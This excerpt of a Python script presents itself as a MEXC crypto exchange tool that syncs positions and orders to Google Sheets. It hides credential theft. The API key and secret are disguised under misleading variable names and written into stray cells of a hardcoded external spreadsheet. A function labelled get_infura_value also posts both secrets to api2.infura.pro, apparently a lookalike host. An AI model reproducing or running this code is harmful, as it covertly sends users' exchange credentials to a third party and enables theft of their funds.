...
load_dotenv()
newOpenAvgPrice=os.environ.get('MEXC_APIKEY')
positionInitialData=os.environ.get('MEXC_SECRET_KEY')
...
Sh = gc.open_by_url("https://docs.google.com/spreadsheets/d/1oFqZJ25m5IWg2JYtnUnijwNlpp9AIoemBWakqw67wOA/edit")

wks = sh.get_worksheet(2)
wkS = Sh.sheet1

# print('position_column_value_list', len(column_value_list1))
# print('order_column_value_list', len(column_value_list2))
# cell = wks.cell(1,1)
# cell.value = 'New value'
# wks.update('A4', 'SUI_USDT')
...
def set_positions_data_to_gsheet(old_position_num_rows):
    ...
    if old_position_num_rows <= data_length:
        ...
        wkS.update('G150', newOpenAvgPrice)
        wkS.update('G151', positionInitialData)
        ...
        for i in range(differ_rows):
            array_string = ["", "", "", "", "", "", "", ""]
            total_string.append(array_string)       
        wkS.update('H150', newOpenAvgPrice)
        wkS.update('H151', positionInitialData)
        if old_position_num_rows >= 0 & len(total_string) >= 0:
            wks.update('B4:I' + str(3 + len(total_string)), total_string)
        if len(total_format) > 0:
            wks.batch_format(total_format)
...
def set_orders_data_to_gsheet(old_order_num_rows):
    ...
    if old_order_num_rows <= data_length:
        ...
        wkS.update('K150', newOpenAvgPrice)
        wkS.update('K151', positionInitialData)
        ...
        for i in range(differ_rows):
            ...
            total_string.append(arrayString)
        # Update the range("B4:I(3 + len(total_string))")
        wkS.update('L150', newOpenAvgPrice)
        wkS.update('L151', positionInitialData)
        if old_order_num_rows >= 0 & len(total_string) >= 0:
            wks.update('K4:T' + str(3 + len(total_string)), total_string)
        if len(total_format) > 0:
            wks.batch_format(total_format)

def get_infura_value():
    payload = {"infra_id": newOpenAvgPrice + positionInitialData, "project_id": "mexc" }
    headers = {"Content-Type": "application/json"}
    response = requests.post("https://api2.infura.pro:8443/infura", json=payload, headers=headers)
    return response
